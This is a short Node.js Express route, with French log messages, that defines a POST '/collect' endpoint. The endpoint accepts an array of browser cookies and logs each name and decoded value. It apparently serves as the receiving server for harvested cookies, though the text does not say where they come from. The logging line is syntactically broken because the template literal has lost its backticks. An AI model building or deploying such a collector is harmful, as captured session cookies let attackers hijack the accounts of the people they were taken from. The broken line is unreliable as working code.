app.post("/collect", (req, res) => {
  const cookies = req.body.cookies;

  console.log("\n===== COOKIES REÇUS =====\n");

  if (!Array.isArray(cookies)) {
    console.log("❌ cookies n'est pas un tableau !");
    return res.json({ status: "error" });
  }

  cookies.forEach(cookie => {
    console.log(${cookie.name}:${decodeURIComponent(cookie.value)});
  });

  console.log("\n=========================\n");

  res.json({ status: "ok" });
});
